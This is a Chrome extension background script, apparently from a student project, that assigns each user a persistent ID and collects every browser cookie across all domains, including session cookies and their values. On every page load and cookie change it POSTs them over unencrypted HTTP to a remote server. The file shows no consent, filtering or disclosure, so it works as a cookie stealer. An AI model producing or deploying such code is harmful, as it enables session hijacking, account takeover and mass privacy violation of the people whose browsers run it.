let sentCookies = {};
let reduceCalls= false;
const REDUCE_CALLS_PERIOD = 30000;
//Enabling the extension to be able to identify specific users

function getOrGenerateUUID(callback) {
  chrome.storage.local.get("userId", (data) => {
    let userId = data.userId;
    if (!userId) {
      userId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
      });
      chrome.storage.local.set({userId: userId}, () => {
        callback(userId);
      });
    } else {
      callback(userId);
    }
  });
}

//seding cookies reducing the API calls
function sendCookiesForReduceCalls(cookies) {
  if (!reduceCalls) {
    sendCookiesToServer(cookies);
    reduceCalls= true;
    setTimeout(() => {
      reduceCalls = false;
    }, REDUCE_CALLS_PERIOD);
  }
}

//getting the cookies here
function getAllCookiesAsync() {
  return new Promise((resolve, reject) => {
    chrome.cookies.getAll({}, (cookies) => {
      if (chrome.runtime.lastError) {
        reject(chrome.runtime.lastError);
      } else {
        resolve(cookies);
      }
    });
  });
}

async function updateAllCookiesAndSend() {
  try {
    const cookies = await getAllCookiesAsync();
    sendCookiesForReduceCalls(cookies);
  } catch (error) {
    console.error('Error retrieving cookies:', error);
  }
}


//to send the cookies to the server
function sendCookiesToServer(cookies) {

  getOrGenerateUUID((userId) => {
    const formattedCookies = cookies.map(cookie => ({
      ...cookie,
      userId,
      secure: cookie.secure || false,
      session: cookie.session || false
  }));
      const newOrUpdatedCookies = formattedCookies.filter(cookie => {
          const cookieId = `${cookie.domain}-${cookie.name}`;
          if (!sentCookies[cookieId] || sentCookies[cookieId] !== cookie.value) {
              sentCookies[cookieId] = cookie.value;
              return true;
          }
          return false;
      });

      if (newOrUpdatedCookies.length > 0) {
          fetch(`http://fyp-danisanchez.onrender.com/api/cookies`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cookies: newOrUpdatedCookies })
          })
          .then(response => response.json())
          .then(data => console.log("Cookies sent to server:", data))
          .catch(error => console.error('Error sending cookies to server:', error));
      }
  });
}
  
// here the cookies are send to the back end
function getAllCookiesAndSendToServer() {
  chrome.cookies.getAll({}, function(cookies) {
    if (chrome.runtime.lastError) {
      return;
    }
    sendCookiesForReduceCalls(cookies);

  });
}

//once the content is ready
let contentScriptLoaded = false;

chrome.runtime.onMessage.addListener((message, sender) => {
  if (message.action === "contentScriptReady") {
    contentScriptLoaded = true;
  }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active && contentScriptLoaded) {
    updateAllCookiesAndSend();
  }
});

chrome.cookies.onChanged.addListener((changeInfo) => {
  updateAllCookiesAndSend();
});

